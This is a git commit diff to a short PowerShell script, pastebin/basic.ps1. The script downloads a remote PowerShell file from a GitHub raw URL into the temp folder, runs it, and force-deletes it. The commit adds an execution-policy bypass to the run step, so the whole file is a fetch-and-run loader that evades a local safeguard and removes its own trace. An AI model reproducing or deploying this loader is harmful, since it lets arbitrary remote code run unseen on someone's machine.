c47c2dcb8706c2bfa26b1c9055c96f72cfcad0ed
cyb1l <60405884+4V4loon@users.noreply.github.com>
2022-07-23 18:41:20 +0400

    Update basic.ps1

--- pastebin/basic.ps1
+++ pastebin/basic.ps1
@@ -1,5 +1,5 @@
 $url = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/pastebin-run.ps1"
 $file="$env:tmp\qq.ps1"
 Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $file
-powershell -file $file
+powershell -executionpolicy bypass -file $file
 remove-item -Path $file -Force
